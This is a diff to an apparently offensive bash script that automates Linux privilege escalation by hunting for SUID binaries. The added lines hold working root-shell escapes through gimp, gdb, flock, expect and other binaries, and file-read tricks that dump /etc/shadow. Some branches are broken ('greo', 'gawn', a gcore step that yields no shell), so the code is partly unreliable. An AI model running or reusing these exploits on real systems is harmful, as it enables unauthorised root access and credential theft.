@@ -7,6 +7,8 @@
 
 #Script only looks at /usr/bin, yes you may have to manually exploit something...
 
+#stopped on gimp
+
 now=$(date)
 i=$(whoami)
 d=$(id)
@@ -28,7 +30,6 @@ echo -e '\E[31;40m' "LHOST"; tput sgr0
 read LHOST
 echo -e '\E[31;40m' "Web server LPORT"; tput sgr0
 read LPORT
-
 echo -e '\E[32;40m' "Before Downloading linpeas looking for easy wins";tput sgr0
 echo "Current user is $i within group $d" > info.txt
 echo "Script last ran on $now" >> info.txt
@@ -66,10 +67,25 @@ read -p "Would you like to try and auto exploit any SUID bits? (y/n):" answer
 if [ $answer = n ]; then
 	echo -e '\E[31;40m' "Not trying to exploit anything, you can see SUID bits in /tmp/suid.txt"
 else
-	if egrep 'find|bash|busybox|chmod|chroot|wget|vim|systemctl|agetty|cabal|capsh|choom|chown|chroot|dash|emacs|env|dmsetup|docker|cp' suid.txt; then
+	if egrep 'find|bash|busybox|chmod|chroot|wget|vim|systemctl|agetty|cabal|capsh|choom|chown|chroot|dash|emacs|env|dmsetup|docker|expect|fish|flock|gcore|gdb|genie|gimp|cp' suid.txt; then
 		echo -e '\E[31;40m' "Found something and trying to exploit"; tput sgr0
 		if grep "/usr/bin/find" suid.txt; then
 			/usr/bin/find . -exec /bin/bash -p \; -quit
+		elif grep -w "/usr/bin/gimp" suid.txt; then
+			/usr/bin/gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl("/bin/sh", "sh", "-p")'
+		elif grep "/usr/bin/gcore" suid.txt; then
+			ss
+			read -p "PID number to move into?" answer
+			PID=$answer
+			/usr/bin/gcore $PID
+		elif greo "/usr/bin/genie" suid.txt; then
+			/usr/bin/genie -c '/bin/sh'
+		elif grep "/usr/bin/gdb" suid.txt; then
+			/usr/bin/gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
+		elif grep "/usr/bin/fish" suid.txt; then
+			/usr/bin/fish
+		elif grep "/usr/bin/flock" suid.txt; then
+			/usr/bin/flock -u / /bin/sh -p
 		elif grep "/usr/bin/bash" suid.txt; then
 			/usr/bin/bash -p
 		elif grep "busybox" suid.txt; then
@@ -174,6 +190,8 @@ else
 		elif grep "/usr/bin/docker" suid.txt; then
 			read -p "Docker type (ex: alpine):" answer
 			/usr/bin/docker run -v /:/mnt --rm -it $answer chroot /mnt sh
+		elif grep -w "/usr/bin/expect" suid.txt; then
+			/usr/bin/expect -c 'spawn /bin/sh -p;interact'
 		else
 		echo -e '\E[31;40m' "Nothing to automatically exploit at this time by $i on $now withing group $d"
 		fi
@@ -186,8 +204,40 @@ if [ $answer = n ]; then
 	echo -e '\E[31;40m' "Not looking for files that will allow us to read other files"
 else
 	echo -e '\E[31;40m' "Looking for files that will allow us to read another file (ex: /etc/shadow)"; tput sgr0
-	if egrep 'base|cat|alpine|ascii-xfr|ash|aspell|atobm|awk|bridge|bzip2|cmp|column|comm|csplit|csvtool|cupsfilter|curl|cut|date|debugfs|dialog|diff|dig|dosbox|efax|arp|ar|ed|dd|bc|as' suid.txt; then
-		if grep -w "/usr/bin/awk" suid.txt; then
+	if egrep 'base|cat|alpine|ascii-xfr|ash|aspell|atobm|awk|bridge|bzip2|cmp|column|comm|csplit|csvtool|cupsfilter|curl|cut|date|genisoimage|debugfs|dialog|diff|dig|dosbox|expand|efax|espeak|arp|eqn|fmt|gawk|ar|ed|dd|bc|as' suid.txt; then
+		if grep -w "/usr/bin/expand" suid.txt; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/expand "$LFILE"
+		elif grep "genisoimage" suid.txt; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/genisoimage -sort "$LFILE"
+		elif grep -w "/usr/bin/gawn" suid.txt; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/gawk '//' "$LFILE"
+		elif grep -w "/usr/bin/fold" suid.txt; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/fold -w99999999 "$LFILE"
+		elif grep -w "/usr/bin/fmt" suid.txt; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/fmt -999 "$LFILE"
+		elif grep -w "/usr/bin/file" suid.txt; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/file -f $LFILE	 
+		elif grep -w "/usr/bin/eqn" suid.txt; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/eqn "$LFILE"
+		elif grep "espeak" suid.txt; then
+			read -p "What file would you like to view (ex: /etc/shadow):" answer
+			LFILE=$answer
+			/usr/bin/espeak -qXf "$LFILE"
+		elif grep -w "/usr/bin/awk" suid.txt; then
 			read -p "What file would you like to view (ex: /etc/shadow):" answer
 			LFILE=$answer 
 			/usr/bin/awk '//' "$LFILE"
